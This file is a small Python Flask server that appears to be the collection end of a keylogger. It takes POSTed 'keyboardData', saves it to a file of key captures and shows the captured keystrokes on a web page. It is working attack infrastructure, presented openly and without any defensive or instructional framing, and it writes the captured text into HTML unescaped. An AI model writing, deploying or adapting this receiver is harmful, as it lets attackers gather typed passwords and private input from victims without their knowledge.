from flask import Flask, request, Response
import os

app = Flask(__name__)
port = 8080
file_path = 'key_captures.txt'

@app.route('/', methods=['GET'])
def get_data():
    try:
        with open(file_path, 'r', encoding='utf8') as file:
            data = file.read()
        html_content = f'<h1 style="color: #3366cc;">Captures</h1><p style="color: #009900;">{data.replace("\n", "<br>")}</p>'
        return Response(html_content, mimetype='text/html')
    except FileNotFoundError:
        return "<h1 style='color: #cc0000;'>Still Capturing......</h1>", 404

@app.route('/', methods=['POST'])
def post_data():
    keyboard_data = request.json.get('keyboardData')
    if keyboard_data is not None:
        with open(file_path, 'w', encoding='utf8') as file:
            file.write(keyboard_data)
        return "Successfully set the data", 200
    else:
        return "Invalid data", 400

if __name__ == '__main__':
    print(f"[+] Server is listening on port {port}...")
    app.run(port=port)
